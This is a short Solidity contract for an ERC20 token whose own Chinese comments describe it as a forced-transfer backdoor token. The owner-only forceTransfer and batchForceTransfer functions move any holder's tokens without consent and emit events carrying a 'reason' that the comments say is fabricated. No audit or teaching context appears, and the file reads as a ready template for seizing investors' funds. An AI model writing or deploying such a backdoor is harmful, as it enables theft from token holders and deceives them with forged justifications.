// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

/**
 * @title ForceTransferToken
 * @notice 强制转账后门代币
 * @dev owner可以在无需授权的情况下转移任何用户的代币
 */
contract ForceTransferToken is ERC20 {
    address public owner;

    event ForcedTransfer(address indexed from, address indexed to, uint256 amount, string reason);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(string memory name, string memory symbol, uint256 supply) ERC20(name, symbol) {
        owner = msg.sender;
        _mint(msg.sender, supply);
    }

    /**
     * @notice 后门：强制转移任意用户资金
     * @param from 来源地址
     * @param to 目标地址
     * @param amount 金额
     * @param reason 伪造的理由
     */
    function forceTransfer(address from, address to, uint256 amount, string calldata reason) external onlyOwner {
        _transfer(from, to, amount);
        emit ForcedTransfer(from, to, amount, reason);
    }

    /**
     * @notice 批量强制转移
     */
    function batchForceTransfer(address[] calldata from, address to, uint256[] calldata amounts) external onlyOwner {
        for (uint256 i = 0; i < from.length; i++) {
            _transfer(from[i], to, amounts[i]);
            emit ForcedTransfer(from[i], to, amounts[i], "Batch seizure");
        }
    }
}
